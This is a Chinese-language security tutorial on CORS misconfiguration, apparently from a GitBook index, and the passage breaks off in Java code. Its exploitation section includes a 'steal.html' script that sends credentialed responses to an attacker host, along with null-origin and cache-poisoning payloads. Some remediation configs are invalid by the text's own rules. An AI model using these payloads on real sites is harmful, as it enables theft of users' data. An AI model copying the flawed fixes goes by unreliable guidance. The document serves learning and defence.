{"./":{"url":"./","title":"Security Book","keywords":"","body":"Readme Web Book Redteam Book Email Book Network Book Other Book Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-14 19:52:52 "},"web/readme.html":{"url":"web/readme.html","title":"Web","keywords":"","body":"关于 Web 的知识合集~ Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-14 19:29:59 "},"web/CORS 跨域漏洞.html":{"url":"web/CORS 跨域漏洞.html","title":"CORS 跨域漏洞","keywords":"","body":"0x01 漏洞描述 概述 CORS，跨域资源共享（Cross-Origin Resource Sharing），是 H5 提供的一种机制，WEB 应用程序可以通过在 HTTP 增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。当该配置不当的时候，就导致资源被恶意操作。 当 CORS 的设置不正确时，就会带来安全问题；当响应头中的 Access-Control-Allow-Origin​​ 设置为 null​​ 或 *​​ 时，表示信任任何域，这时候就可能引入安全问题。 「你的 Request 還是有發出去的」，而且瀏覽器也「確實有收到 Response」，重點是「瀏覽器因為同源政策，不把結果傳回給你的 JavaScript」。如果沒有瀏覽器的話其實就沒有這些問題，你愛發給誰就發給誰，不管怎樣都拿得到 Response。 當瀏覽器收到 Response 之後，會先檢查 Access-Control-Allow-Origin​​​ 裡面的內容，如果裡面有包含現在這個發起 Request 的 Origin 的話，就會允許通過，讓程式順利接收到 Response。 所以，同源策略并不限制请求的发起和响应，只是浏览器拒绝了 js​​​ 对响应资源的操作。【该漏洞的测试误区，要注意同源限制策略是针对浏览器的】 测试方法 测试人员访问某个 url，将请求头中的 Origin 字段修改为任意值，结果仍然能获得正确的响应报文（这会导致误报不应该使用该测试方法），就说明有 CORS 漏洞 可以通过浏览器的控制台的 network，查看接口的请求包 response 头中 Access-Control-Allow-Origin 是否设置为 *​​ 也可以通过抓包工具，查看接口返回的 response 中是 Access-Control-Allow-Origin 是否设置为 * or null 等其他配置组合，详见下文。​​ 漏洞示例 配置 Access-Control-Allow-Origin 为 *​​ 配置 Access-Control-Allow-Origin 但是该值可控 0x02 CORS 详解 CORS 是一个 W3C 标准，全称是\"跨域资源共享\"（Cross-origin resource sharing）。CORS 的基本原理是，第三方网站服务器生成访问控制策略，指导用户浏览器放宽 SOP 的限制，实现与指定的目标网站共享数据。 它允许浏览器向跨源服务器，发出 XMLHttpRequest​​​ ​请求，从而克服了 AJAX 只能同源使用的限制 CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE 浏览器不能低于 IE10。 整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与同源的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX​​ 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。 因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。 JSONP 只支持 GET​​ 请求，CORS 支持所有类型的 HTTP 请求。 JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。 CORS 工作流程（针对浏览器的） 请求方脚本从用户浏览器发送跨域请求。浏览器会自动在每个跨域请求中添加 Origin 头，用于声明请求方的源。 资源服务器根据请求中 Origin 头返回访问控制策略(Access-Control-Allow-Origin 响应头)，并在其中声明允许读取响应内容的源。 浏览器检查资源服务器在 Access-Control-Allow-Origin 头中声明的源，是否与请求方的源相符，如果相符合，则允许请求方脚本读取响应内容，否则不允许。 什么是同源 & 跨域 同源：协议相同 & 端口相同 & 主机（域名）相同 跨域：上述之一不同，如 网络协议不同，如 http 协议访问 https 协议 ; 端口不同，如 80 端口访问 8080 端口 ; 域名不同，如 www.test1.com 访问 www.test2.com ; 子域名不同，如 abc.test1.com 访问 def.test1.com ; 浏览器将 CORS 请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。 一些应用场景 比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题。 程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送 ajax 请求，请求另外一个页面的内容的时候，就会跨域。 电商网站想通过用户浏览器加载第三方快递网站的物流信息。 子站域名希望调用主站域名的用户资料接口，并将数据显示出来。 简单请求 只要同时满足以下两大条件，就属于简单请求。 （1）请求方法是以下三种方法之一： HEAD GET POST （2）HTTP 的头信息不超出以下几种字段： Accept Accept-Language Content-Language Last-Event-ID Content-Type：只限于三个值 application/x-www-form-urlencoded​​、multipart/form-data​​、text/plain​​ 这是为了兼容表单（form），因为历史上表单一直可以发出跨域请求。AJAX​​ 的跨域设计就是，只要表单可以发，AJAX 就可以直接发。 凡是不同时满足上面两个条件，就属于非简单请求。 浏览器对这两种请求的处理，是不一样的。 基本流程 对于简单请求，浏览器直接发出 CORS 请求。 具体来说，就是在头信息之中，增加一个 Origin​​ ​字段。 下面是一个例子，浏览器发现这次跨源 AJAX​​ 请求是简单请求，就自动在头信息之中，添加一个 Origin​​ ​字段。 GET /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... 上面的头信息中，Origin​ ​字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。 如果 Origin​​ ​指定的源，不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现，这个回应的头信息没有包含 Access-Control-Allow-Origin​​ ​字段（详见下文），就知道出错了，从而抛出一个错误，被 XMLHttpRequest​​ ​的 onerror​​ ​回调函数捕获。注意，这种错误无法通过状态码识别，因为 HTTP 回应的状态码有可能是 200。 如果 Origin​ ​指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。 Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Credentials: true Access_control-Allow-Method: * Access-Control-Expose-Headers: FooBar Content-Type: text/html; charset=utf-8 上面的头信息之中，有三个与 CORS 请求相关的字段，都以 Access-Control-​ ​开头。 （1）Access-Control-Allow-Origin 该字段是必须的。它的值要么是请求时 Origin​​ 字段的值，要么是一个 *​​ ，表示接受任意域名的请求。 （2）Access-Control-Allow-Credentials 该字段可选。它的值是一个布尔值，表示是否允许发送 Cookie​​。默认情况下，Cookie 不包括在 CORS 请求之中。设为 true​​​，即表示服务器明确许可，Cookie 可以包含在请求中，一起发给服务器。这个值也只能设为 true​​​，如果服务器不要浏览器发送 Cookie，删除该字段即可。 （3）Access-Control-Expose-Headers 该字段可选。CORS 请求时，XMLHttpRequest​​ ​对象的 getResponseHeader()​​ ​方法只能拿到 6 个基本字段：Cache-Control​​​、Content-Language​​​、Content-Type​​​、Expires​​​、Last-Modified​​​、Pragma​​​。如果想拿到其他字段，就必须在 Access-Control-Expose-Headers​​ ​里面指定。上面的例子指定，getResponseHeader('FooBar')​​ ​可以返回 FooBar​​ ​字段的值。 （4）Access-Control-Allow-Methods​ 该字段表示允许请求的方法，比如 GET, POST, PUT, DELETE 等 ​add_header 'Access-Control-Allow-Methods' *;​​ // 表示允许任意方法 服务端的 Nginx 配置 请确保将配置行添加到 http​​ 配置块的大括号 ({}​​) 内并保存重启 Nginx。 http { include mime.types; default_type application/octet-stream; # 其他配置... # 添加下面这行配置，允许跨域请求的网站 #add_header 'Access-Control-Allow-Origin' 'http://xxx.xxx.xxx'; add_header 'Access-Control-Allow-Origin' '*'; #add_header 'Access-Control-Allow-Credential' 'true'; add_header 'Access_control-Allow-Method' '*'; # 其他配置... } withCredentials 属性 上面说到，CORS 请求默认不发送 Cookie 和 HTTP 认证信息。如果要把 Cookie 发到服务器，一方面要服务器同意，指定 Access-Control-Allow-Credentials​ ​字段。 Access-Control-Allow-Credentials: true 另一方面，开发者必须在 AJAX​​ 请求中打开 withCredentials​​ ​属性。 var xhr = new XMLHttpRequest(); xhr.withCredentials = true; 否则，即使服务器同意发送 Cookie，浏览器也不会发送。或者，服务器要求设置 Cookie，浏览器也不会处理。 但是，如果省略 withCredentials​ ​设置，有的浏览器还是会一起发送 Cookie。这时，可以显式关闭 withCredentials​​。 xhr.withCredentials = false; 需要注意的是，如果要发送 Cookie，Access-Control-Allow-Origin​​ ​就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨源）原网页代码中的 document.cookie​​ ​也无法读取服务器域名下的 Cookie。 非简单请求 非简单请求是那种对服务器有特殊要求的请求，比如请求方法是 PUT​​ 或 DELETE​​，或者 Content-Type​​ 字段的类型是 application/json​​。 非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为\"预检\"请求（preflight​​）。 预检请求 浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的 XMLHttpRequest​ ​请求，否则就报错。 下面是一段浏览器的 JavaScript 脚本，在浏览器 consolo​​ 执行。 var url = 'http://api.alice.com/cors'; var xhr = new XMLHttpRequest(); xhr.open('PUT', url, true); xhr.setRequestHeader('X-Custom-Header', 'value'); xhr.send(); 上面代码中，HTTP 请求的方法是 PUT​​，并且发送一个自定义头信息 X-Custom-Header​​。 浏览器发现，这是一个非简单请求，就自动发出一个\"预检\"请求，要求服务器确认可以这样请求。下面是这个\"预检\"请求的 HTTP 头信息。 OPTIONS /cors HTTP/1.1 Origin: http://api.bob.com Access-Control-Request-Method: PUT Access-Control-Request-Headers: X-Custom-Header Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... \"预检\"请求用的请求方法是 OPTIONS​​​，表示这个请求是用来询问的。头信息里面，关键字段是 Origin​​​，表示请求来自哪个源。 除了 Origin​ ​字段，\"预检\"请求的头信息包括两个特殊字段。 （1）Access-Control-Request-Method 该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是 PUT​​。 （2）Access-Control-Request-Headers 该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是 X-Custom-Header​​​​。 为什么需要预请求？ 假設今天某個 Server 提供了一個 API 網址叫做：https://example.com/data/16​​，你只要對它發送 GET，就能夠拿到 id 是 16 的資料，只要對它發送 DELETE，就可以把這筆資料刪除。 如果今天沒有 Preflight Request 這個機制的話，我就可以在隨便一個 Domain 的網頁上面發送一個 DELETE 的 Request 給這個 API。剛剛我有強調說瀏覽器的 CORS 機制，還是會幫你發送 Request，但只是 Response 被瀏覽器擋住而已。 因此呢，儘管沒有 Response，但是 Server 端的確收到了這個 Request，因此就會把這筆資料給刪除。 如果有 Preflight Request 的話，在發送出去收到結果的時候，就會知道這個 API 並沒有提供 CORS，因此真的 DELETE 請求就不會送出，到這邊就結束了。 先用一個 OPTIONS 的請求去確認之後的 Request 能不能送出，這就是 Preflight Request 的目的。 预检请求的回应 服务器收到\"预检\"请求以后，检查了 Origin​​、Access-Control-Request-Method​ ​和 Access-Control-Request-Headers​ ​字段以后，确认允许跨源请求，就可以做出回应。 HTTP/1.1 200 OK Date: Mon, 01 Dec 2008 01:15:39 GMT Server: Apache/2.0.61 (Unix) Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: X-Custom-Header Content-Type: text/html; charset=utf-8 Content-Encoding: gzip Content-Length: 0 Keep-Alive: timeout=2, max=100 Connection: Keep-Alive Content-Type: text/plain 上面的 HTTP 回应中，关键的是 Access-Control-Allow-Origin​​ ​字段，表示 http://api.bob.com​​ ​可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。 Access-Control-Allow-Origin: * 如果服务器否定了\"预检\"请求，会返回一个正常的 HTTP 回应，但是没有任何 CORS 相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被 XMLHttpRequest​​ ​对象的 onerror​​ ​回调函数捕获。控制台会打印出如下的报错信息。 XMLHttpRequest cannot load http://api.alice.com. Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin. 服务器回应的其他 CORS 相关字段如下。 Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: X-Custom-Header Access-Control-Allow-Credentials: true Access-Control-Max-Age: 1728000 （1）Access-Control-Allow-Methods 该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次\"预检\"请求。 （2）Access-Control-Allow-Headers 如果浏览器请求包括 Access-Control-Request-Headers​ ​字段，则 Access-Control-Allow-Headers​ ​字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在\"预检\"中请求的字段。 （3）Access-Control-Allow-Credentials 该字段与简单请求时的含义相同。 （4）Access-Control-Max-Age 该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是 20 天（1728000 秒），即允许缓存该条回应 1728000 秒（即 20 天），在此期间，不用发出另一条预检请求。 浏览器的正常请求和回应 一旦服务器通过了\"预检\"请求，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个 Origin​​ ​头信息字段。服务器的回应，也都会有一个 Access-Control-Allow-Origin​​ ​头信息字段。 下面是\"预检\"请求之后，浏览器的正常 CORS 请求。 PUT /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com X-Custom-Header: value Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... 上面头信息的 Origin​ ​字段是浏览器自动添加的。 下面是服务器正常的回应。 Access-Control-Allow-Origin: http://api.bob.com Content-Type: text/html; charset=utf-8 上面头信息中，Access-Control-Allow-Origin​ ​字段是每次回应都必定包含的。 0x03 CORS 错误配置类型 反射 Origin 头 如下配置： Access-Control-Allow-Origin: http://a.com, http://c.com 或者 Access-Control-Allow-Origin: http://*.a.com 这两种域名事实上配置是错误的，因为 CORS 标准规定，Access-Control-Allow-Origin​​ 只能配置为单个 origin, null​​ 或 *​​。如果开发者想要实现同时与多个域名共享域名的需求，则需要专门编写代码或者使用框架来协助动态生成访问控制策略。 最简单地动态生成访问控制策略的方法，就是在 Access-Control-Allow-Origin 中反射请求的 Origin 值。例如，下面是一个错误 Nginx 配置示例： add_header \"Access-Control-Allow-Origin\" $http_origin; // 单纯的 add_header “Access-Control-Allow-Credentials” “true”; 这种配置非常危险，相当于信任任意网站，给攻击者网站敞开了大门。任意攻击者网站可以直接跨域读取其资源内容。 Origin 校验错误 前缀匹配: 资源服务器在检查请求中 Origin 值时，只匹配了前缀。例如 www.example.com 想要允许 example.com 访问，但是只做了前缀匹配，导致同时信任了 example.com.attack.com 的访问，而 example.com.attack.com 是攻击者可以控制的网站。 后缀匹配：资源服务器在检查请求中 Origin 值时，只做了后缀匹配。例如 www.example.com 想要允许 example.com 访问，由于后缀匹配出错，导致允许 attackexample.com 访问。 没有转义 .​​：例如，example.com 想要允许 www.example.com 访问时，但正则匹配没有转义 .​​，导致允许 wwwaexample.com 访问。 包含匹配：我们还发现有的网站 www.example.com 想要允许 example.com，但是 Origin 校验出错，出现允许 ample.com 访问。 信任 null RFC 6564 规定，如果请求来自隐私敏感上下文时，Origin 头的值应该为 null，但是它却没有明确界定什么是隐私敏感上下文。 CORS 协议复用了 Origin 头，有些开发者在网站上配置信任 null，用于与本地 file 页面共享数据，如下所示： Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true 但是事实上，除了本地 file 页面的跨域请求 Origin 头为 null 外，攻击者还可以从任意域下通过 iframe sandbox 构造 Origin 为 null 的跨域请求，如下是一段示意代码： XMLHttpRequest here’> 这就意味着任何配置有 Access-Control-Allow-Origin: null​​ ​和 Access-Control-Allow-Credentials:true​​ ​的网站等同于没有浏览器 SOP 的保护，都可以被其他任意域以这种方式读取内容。 e.g. var xhr=new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { alert(xhr.responseText); } } xhr.open(\"GET\", \"http://www.vuln.com:8081/cors/corsvuln.jsp\", true); xhr.withCredentials = true; xhr.send();'> HTTPS 域信任 HTTP 域 中间人攻击者可以先劫持受信任 HTTP 域，然后通过这个域发送跨域请求到 HTTPS 网站，间接读取 HTTPS 域下的受保护内容。 信任自身全部子域 很多网站为了方便会将 CORS 配置为信任全部自身子域，这种配置会导致子域 XSS 的危害被强化。为了防止某个子域上 XSS 漏洞的危害其他子域，浏览器设计了 Cookie 的 httponly 标志，用于限制 Javascript 读取 Cookie，因此某个子域 XSS 不能读取带有 httponly 标记的 Cookie，难以窃取其他重要子域上的敏感内容。 但是如果这个域配置了 CORS 且信任全部子域，那么攻击者可以利用其他任意子域上 XSS 漏洞，发送跨域请求到目标重要域网站，从而获取敏感内容。 ​Origin:*​​​ 与 Credentials:true​​​ 共用 CORS 规定，Access-Control-Allow-Origin:*​​ 与 Access-Control-Allow-Credentials:true​​ 不能同时使用。浏览器会对下面这种误配置报错： Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true 这就意味着，Access-Control-Allow-Origin:*​​ 只能用于共享公开资源。 缺少 Vary:Origin​​​ 头 当资源服务器需要共享多个域名时，它需要每个不同请求域的跨域请求生成不同的访问控制策略。但一旦这个资源内容需要被缓存，则会带来 CORS 失效问题。例如，c.com 同时允许 a.com 和 b.com 共享。c.com 资源内容首先被 a.com 脚本跨域访问后被缓存，其中缓存响应头为 Access-Control-Allow-Origin: http://a.com​​”。这时，b.com 脚本则不能读取缓存响应内容，因为缓存响应头是允许 a.com 共享，而不是 b.com。HTTP 协议提供了 Vary 头，用于解决这种情况，资源服务器需要在响应头中配置 Vary:Origin​​ 头来指导缓存，为每个不同的 Origin 头缓存一份不同的内容。 0x04 挖掘利用 CORS 的漏洞主要看当我们发起的请求中带有 Origin 头部字段时，服务器的返回包带有 CORS 的相关字段并且允许 Origin 的域访问。 变换请求头的 origin 字段，如果返回包中的 Access-Control-Allow-Origin​​ 内容和发送的 origin 头内容相同，则存在此问题。 利用 前提：含有 CORS 配置的网站 利用 html 标签和表单发送请求 访问内网敏感资源 绕过返会话劫持 一般形式跨域请求利用 在攻击者自己控制的网页上嵌入跨域请求，用户访问链接，执行了跨域请求，从而攻击目标。 方法一：检测工具 GitHub - chenjj/CORScanner: 🎯 Fast CORS misconfiguration vulnerabilities scanner EXP & POC Hello,this is evil page. CORS POC Exploit Exploit function corsExploit() { var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function () { if (xhr.readyState == 4 && xhr.status == 200) //if receive xhr response { //var datas=xhr.responseText; //alert(datas); //document.getElementById(\"demo\").innerHTML = alert(this.responseText); document.getElementById(\"demo\").innerHTML = alert(xhr.responseText); } } // request vuln page，需要攻击的目标 xhr.open(\"GET\", \"http://www.vuln.com:8081/cors/corsvuln.jsp\", \"true\") xhr.send(); } 绕过 http_only 获取 cookie 在攻击这服务器创建 cookiebypass.jsp​​ 在攻击者可控网站创建 steal.html​​ cors exploit function exploit() { var xhr1; var xhr2; if (window.XMLHttpRequest) { xhr1 = new XMLHttpRequest(); xhr2 = new XMLHttpRequest(); } else { xhr1 = new ActiveXObject(\"Microsoft.XMLHTTP\"); xhr2 = new ActiveXObject(\"Microsoft.XMLHTTP\"); } xhr1.onreadystatechange = function () { if (xhr1.readyState == 4 && xhr1.status == 200) { var datas = xhr1.responseText; // 攻击这服务器地址 xhr2.open(\"POST\", \"http://mob.exp:8081/manager/cookiebypass.jsp\", \"true\"); xhr2.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\"); xhr2.send(\"ck=\" + escape(datas)); } } // 需要攻击的目标 xhr1.open(\"GET\", \"http://www.vuln.com:8081/cors/corsvuln.jsp\", \"true\") xhr1.withCredentials = true; xhr1.send(); } exploit(); 访问 mob.exp:8081/manager/steal.html，可以看到返回内容写入 secrect.html 中。 方法二：利用 Burpsuit 搭建测试环境，Nginx 配置如下： 选择 Proxy -- Options -- Match and Replace，勾选 Request header。 将空替换为 Origin:foo.example.org​​​ 的 Enable 框。 然后在网站一阵乱点，最后在 HTTP history 来筛选带有 CORS 头部的值，然后用以上工具查看是否有配置缺陷。 Burpsuite：自动在 HTTP 请求包中加上 Origin 的头部字段。 在 Filter by search term 中输入：Access-Control-Allow-Origin: foo.example.org​​ HTTP history 列表中出现符合条件的请求包，点击 Ctrl+R（发送到 Repeater），点击 GO，观察返回的 CORS 配置。 方法三：curl 命令 curl 命令，输入 curl http://127.0.0.1/DoraBox-master/csrf/userinfo.php -H \"Origin:https://example.com/\" -I 方法四：浏览器测试 利用 Ajax 发送一个简单请求，看是否允许。 var url = 'http://172.16.10.113/xxxxmail'; var xhr = new XMLHttpRequest(); xhr.open('GET', url, true); xhr.send(); // 或者 $.get(\"http://172.16.10.113/xxxxmail\") ======== # 浏览器控制台示例 # 在服务器（被攻击目标） 192.168.202.110 上配置有漏洞的 nginx.conf # 打开攻击者的网站 http://xxx.xxx.xxx/，（或者随便一个网站）再打开控制台 # 在允许的域（网站），打开控制台 $.get(\"http://192.168.202.110:8081\") {readyState: 1, getResponseHeader: ƒ, getAllResponseHeaders: ƒ, setRequestHeader: ƒ, overrideMimeType: ƒ, …} # 不允许的域 $.get(\"http://192.168.202.110:8081\") {readyState: 1, getResponseHeader: ƒ, getAllResponseHeaders: ƒ, setRequestHeader: ƒ, overrideMimeType: ƒ, …} /xxxmail/xxx4/index.jsp Access to XMLHttpRequest at 'http://192.168.202.110:8081/' from origin 'http://172.16.10.113' has been blocked by CORS policy: The 'Access-Control-Allow-Origin' header has a value 'http://mt.icoremail.net' that is not equal to the supplied origin. loginCommon.c2f53.js:1 GET http://192.168.202.110:8081/ net::ERR_FAILED 200 (OK) send @ 实验测试 环境准备 我们首先修改 host 文件，加上 127.0.0.1 mob.exp 127.0.0.1 www.vuln.com 这样我们访问 www.vuln.com 就相当于服务端。服务端新建 corsvuln.jsp。 Vulnerability Page 接着在 hacker 端 mob.exp 构造 steal.html，这里我们假设是 http://mob.exp:8081/manager/steal.html Hello,this is evil page. function loadXMLDoc() { var xhr = new XMLHttpRequest(); xhr.onreadystatechange=function() { if(xhr.readyState == 4 && xhr.status == 200) //if receive xhr response { var datas=xhr.responseText; alert(datas); } } // request vuln page，存在漏洞的攻击目标 xhr.open(\"GET\",\"http://www.vuln.com:8081/cors/corsvuln.jsp\",\"true\") xhr.send(); } loadXMLDoc(); 根据同源策略，这是不允许的，结果也和我们想的一样。 上面说过，同源策略并不限制请求的发起和响应，只是浏览器拒绝了 js 对响应资源的操作，这点我们抓包就可以看出来。（所以说测试方法中的 1 是不对的） 我们修改 corsvuln.jsp 使用 CORS 使其可以跨域访问，添加一个 Access-Control-Allow-Origin 的返回头。 response.setHeader(\"Access-Control-Allow-Origin\", \"http://mob.exp:8081\"); 再次访问 mob.exp:8081/manager/steal.html 发现可以正常 alert 了，成功实现了跨域资源的请求。 我们只是在响应头加上了 Access-Control-Allow-Origin: http://mob.exp:8081​​ 浏览器看到这个，认为这是服务端允许的跨域请求，就不再阻拦 js 对获取内容的操作了。 获取用户凭证 方式一：存在用户凭证 Access-Control-Allow-Origin “访问控制允许凭据”值 是否可利用 备注 攻击者掌握的域名 真的 是 * 真的 否 浏览器报错 null（空值） 真的 是 任意网站使用沙盒 iframe 来获取 null 源 搜狐视频 CORS 误配置漏洞演示：https://www.youtube.com/watch?v=PWbPbtyyNi8 方式二：不存在用户凭证 Access-Control-Allow-Origin 是否可利用 攻击者掌握的域名 是 null（空值） 是 * 是 绕过基于 IP 的认证 如果目标应用程序与受害者的网络可达性，并且目标应用程序使用 IP 地址作为身份验证的方式，则黑客会利用受害者的浏览器作为代理去访问那些目标应用程序并且可以绕过那些基于 IP 的身份验证。 客户端缓存中毒 例如，数据报文头部中包含 X-User 标头，其值未进行任何输入验证，输出编码。 请求包 GET /login HTTP/1.1 Host: www.target.local Origin: https://attacker.domain/ X-User: 响应包 Access-Control-Allow-Origin 已被设置，Access-Control-Allow-Credentials: true 与 Vary: Origin 头已经设置。 HTTP/1.1 200 OK Access-Control-Allow-Origin: https://attacker.domain/ … Content-Type: text/html … Invalid user: 构造存在恶意的 XSS 有效负载页面，诱使受害者触发。 var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','http://www.target.local/login',true); req.setRequestHeader('X-User', ''); req.send(); function reqListener() { location='http://www.target.local/login'; } 服务器端缓存中毒 利用 CORS 的错误配置注入任意 HTTP 头部，将其保存在服务器端缓存中，可用于构造存储类型 XSS。 利用条件：存在服务器端缓存，能够反射 Origin 头部，不会检查 Origin 头部中的特殊字符，如 \\r 利用方式：攻击 IE / Edge 用户（IE / Edge 使用 \\r 作为的 HTTP 标题段的终结符） 请求包 GET / HTTP/1.1 Origin: z[0x0d]Content-Type: text/html; charset=UTF-7 回车（CR）：ASCII 码：'\\r' ，十六进制：0x0d 响应包 HTTP/1.1 200 OK Access-Control-Allow-Origin: z Content-Type: text/html; charset=UTF-7 如果攻击者能提前发送畸形的 Origin 消息头，则利用代理或命令行的方式发送，则服务器就会缓存这样的返回报文并作用于其他用户。上例中，攻击者将页面的编码设置为 UTF-7，可引发 XSS 中断。 配合 XSS 劫持会话 在正常的网页被嵌入了到攻击者控制页面的跨域请求，从而劫持用户的会话。 交互式 xss。通过 cors，绕过一些反会话劫持的方法，如 HTTP-Only 限制的 cookie，绑定 IP 地址的会话 ID 等，劫持用户会话。 程序猿在写 ajax 请求的时候，对目标域限制不严，有点类似于 url 跳转。 facebook 出现过这样一个案例，javascript 通过 url 里的参数进行 ajax 请求。 ​ 0x05 修复方法 修复方法是合理配置 CORS，判断 Origin 是否合法；具体说就是不让在 nginx 或 tomcat 中配置【Access-Control-Allow-Origin *​​​​​】或【Access-Control-Allow-Origin null​​​​​】。 关闭非正式开启的 CORS，不要信任全部自身子域，减少攻击面 不要配置 Access-Control-Allow-Origin​​​ 为通配符 *​​​ 或 null​​​，严格校验来自请求数据包中 Origin​​​ 的值 彻底的返回 Vary: Origin​​​ 右边，突破攻击者利用浏览器缓存进行攻击 仅在接收到跨域请求时才配置有关于跨域的头部，并确保跨域请求是合法的源，以减少攻击者恶意利用的可能性 HTTPS 网站不要信任 HTTP 域 # 允许跨域请求的域，* 代表所有；null 可以用来和本地 file 页面共享数据 add_header 'Access-Control-Allow-Origin' *; # 允许请求的 header add_header 'Access-Control-Allow-Headers' *; # 允许带上 cookie 请求，不能和允许跨域请求的域 * 一同使用，Origin 需要明确的配置允许来源的域。因为 * 这种配置只能用于共享公开资源，对于共享公开资源，不应该需要身份认证。 add_header 'Access-Control-Allow-Credentials' 'true'; # 允许请求的方法，比如 GET,POST,PUT,DELETE add_header 'Access-Control-Allow-Methods' *; 修改 Nginx 配置文件 方法一：使用通配符 *​​ location / { add_header Access-Control-Allow-Origin *.xxx.com; add_header Access-Control-Allow-Headers \"Origin， X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } 方法二：指定域名白名单 根据错误配置类型，该方法有待确认。 # 使用域名 location / { add_header Access-Control-Allow-Origin http://www.xixixi123.com; add_header Access-Control-Allow-Headers \"Origin， X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } # 指定 ip 与端口，可以逗号拼接 location / { add_header Access-Control-Allow-Origin http://10.130.222.222:6500,http://10.130.222.223:6500; add_header Access-Control-Allow-Headers \"Origin， X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } 方法三：使用正则表达式 location ~ /myurl(.*) { if ( $http_origin ~ '^http(s)?://(localhost|10\\.130\\.222\\.222):6500$' { add_header Access-Control-Allow-Origin $http_origin; } if ( $http_origin ~ '^http(s)?://(localhost|10\\.130\\.222\\.223):6500$' { add_header Access-Control-Allow-Origin $http_origin; } add_header Access-Control-Allow-Headers \"Origin， X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } 说明 ​$ http_origin​​ 可以获取到请求头中的 Origin 字段；但是如果请求头没有，就获取不到了； ​^​​ 是正则表达式，表示开头位置；$​​ 是正则表达式，表示结尾位置 ​?​​ 是正则表达式，表示 s 可能有，也可能没有，这两种情况都可以匹配 .​​​ 是把 .​​ 转义成普通字符的意思 nginx 中，if 后必须加空格，然后才能写 (​​，否则会报错；nginx 中，没有 else if nginx 解决复杂请求跨域的时候需加上 aways 参数eg：add_header 'Access-Control-Allow-Origin' \"$http_origin\" always;​​ 原因：As of Nginx 1.7.5, add_header supports an \"always\" parameter which​allows CORS to work if the backend returns 4xx or 5xx status code.​​参考资料：https://gist.github.com/Stanback/7145487 白名单配置示例 Tomcat 过滤路由 package filter; import java.io.IOException; import java.io.UnsupportedEncodingException; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; import java.util.Arrays; import javax.servlet.Filter; import javax.servlet.FilterChain; import javax.servlet.FilterConfig; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.xml.ws.http.HTTPException; @WebFilter(\"/Cors\") public class CorsFilter implements Filter { /** * Default constructor. */ public FilterConfig config; public CorsFilter() { // TODO Auto-generated constructor stub } /** * @see Filter#destroy() */ public void destroy() { // TODO Auto-generated method stub this.config = null; } /** * @see Filter#doFilter(ServletRequest, ServletResponse, FilterChain) */ public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { //配置可信域名 String[] authhosts = {\"http://www.abc.com:8008\", \"http://www.abcyy.com\"}; String authost = \"\"; HttpServletRequest httprequest = (HttpServletRequest) request; String origin = httprequest.getHeader(\"origin\"); HttpServletResponse httpresponse = (HttpServletResponse) response; if (origin 